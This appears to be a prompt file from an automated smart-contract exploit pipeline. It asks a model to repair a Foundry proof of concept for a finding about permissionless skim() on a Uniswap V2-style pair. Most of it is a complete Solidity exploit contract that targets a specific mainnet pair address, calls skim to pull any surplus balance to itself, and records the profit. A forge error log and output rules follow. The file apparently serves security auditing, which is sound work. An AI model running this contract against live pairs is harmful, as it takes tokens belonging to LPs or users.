@@ -1,0 +1,229 @@
+You are fixing a failing Foundry PoC for finding F-002.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Finding:
+- title: Positive-balance token mechanics let anyone skim unaccounted surplus from the pair
+- claim: `skim(to)` is permissionless and transfers `balanceOf(pair) - reserve` for each pool asset. If either listed token can increase the pair's balance without going through `mint`/`swap`/`sync` (for example via positive rebases, yield accrual, reflections, or accidental direct transfers), any caller can immediately withdraw that surplus.
+- impact: Pools that list balance-increasing or yield-bearing tokens can leak rebased/accrued value to arbitrary callers instead of LPs. Integrations or users that transfer pool assets directly to the pair can also lose those excess tokens to the first account that calls `skim`.
+- exploit_paths: ["A listed token increases the pair's balance outside normal AMM flows -> reserves stay stale -> attacker calls `skim(attacker)` -> attacker receives the entire surplus amount"]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function skim(address to) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
+    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+
+    address public token0;
+    address public token1;
+
+    uint112 public reserve0Before;
+    uint112 public reserve1Before;
+    uint112 public reserve0After;
+    uint112 public reserve1After;
+
+    uint256 public balance0Before;
+    uint256 public balance1Before;
+    uint256 public balance0After;
+    uint256 public balance1After;
+
+    uint256 public surplus0Before;
+    uint256 public surplus1Before;
+    uint256 public surplus0After;
+    uint256 public surplus1After;
+
+    uint256 public gain0;
+    uint256 public gain1;
+
+    constructor() payable {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        _resetRunState();
+        executed = true;
+
+        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
+        token0 = pair.token0();
+        token1 = pair.token1();
+
+        (reserve0Before, reserve1Before, ) = pair.getReserves();
+        balance0Before = _balanceOf(token0, TARGET_PAIR);
+        balance1Before = _balanceOf(token1, TARGET_PAIR);
+
+        // exploit_path stage 1:
+        // a listed token must already have increased the pair balance outside mint/swap/sync, or a third
+        // party must already have directly transferred pool assets to the pair. That condition is visible as
+        // `balanceOf(pair) > reserve` on at least one side before the attacker acts.
+        surplus0Before = balance0Before > uint256(reserve0Before) ? balance0Before - uint256(reserve0Before) : 0;
+        surplus1Before = balance1Before > uint256(reserve1Before) ? balance1Before - uint256(reserve1Before) : 0;
+
+        // If both surpluses are zero, the exploit path is mechanically infeasible at this fork state:
+        // there is no pre-existing third-party value to skim. Creating the surplus ourselves by donating
+        // assets to the pair would only round-trip our own capital and would not be net attacker profit.
+        if (surplus0Before == 0 && surplus1Before == 0) {
+            hypothesisRefuted = true;
+            _profitToken = address(0);
+            _profitAmount = 0;
+            return;
+        }
+
+        uint256 attacker0Before = _balanceOf(token0, address(this));
+        uint256 attacker1Before = _balanceOf(token1, address(this));
+
+        // exploit_path stage 2 + 3:
+        // reserves remain stale relative to real balances, then any caller can invoke `skim(to)` to pull the
+        // entire unaccounted surplus to themselves.
+        pair.skim(address(this));
+
+        uint256 attacker0After = _balanceOf(token0, address(this));
+        uint256 attacker1After = _balanceOf(token1, address(this));
+        gain0 = attacker0After > attacker0Before ? attacker0After - attacker0Before : 0;
+        gain1 = attacker1After > attacker1Before ? attacker1After - attacker1Before : 0;
+
+        (reserve0After, reserve1After, ) = pair.getReserves();
+        balance0After = _balanceOf(token0, TARGET_PAIR);
+        balance1After = _balanceOf(token1, TARGET_PAIR);
+        surplus0After = balance0After > uint256(reserve0After) ? balance0After - uint256(reserve0After) : 0;
+        surplus1After = balance1After > uint256(reserve1After) ? balance1After - uint256(reserve1After) : 0;
+
+        hypothesisValidated = gain0 > 0 || gain1 > 0;
+        hypothesisRefuted = !hypothesisValidated;
+
+        _selectProfitTokenAndAmount();
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _selectProfitTokenAndAmount() internal {
+        if (gain0 == 0 && gain1 == 0) {
+            _profitToken = address(0);
+            _profitAmount = 0;
+            return;
+        }
+
+        if (token0 == MAINNET_WETH && gain0 > 0) {
+            _profitToken = token0;
+            _profitAmount = gain0;
+            return;
+        }
+
+        if (token1 == MAINNET_WETH && gain1 > 0) {
+            _profitToken = token1;
+            _profitAmount = gain1;
+            return;
+        }
+
+        if (gain0 >= gain1) {
+            _profitToken = token0;
+            _profitAmount = gain0;
+        } else {
+            _profitToken = token1;
+            _profitAmount = gain1;
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
+        if (token == address(0)) {
+            return 0;
+        }
+
+        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!ok || ret.length < 32) {
+            return 0;
+        }
+
+        amount = abi.decode(ret, (uint256));
+    }
+
+    function _resetRunState() internal {
+        hypothesisValidated = false;
+        hypothesisRefuted = false;
+
+        token0 = address(0);
+        token1 = address(0);
+
+        reserve0Before = 0;
+        reserve1Before = 0;
+        reserve0After = 0;
+        reserve1After = 0;
+
+        balance0Before = 0;
+        balance1Before = 0;
+        balance0After = 0;
+        balance1After = 0;
+
+        surplus0Before = 0;
+        surplus1Before = 0;
+        surplus0After = 0;
+        surplus1After = 0;
+
+        gain0 = 0;
+        gain1 = 0;
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
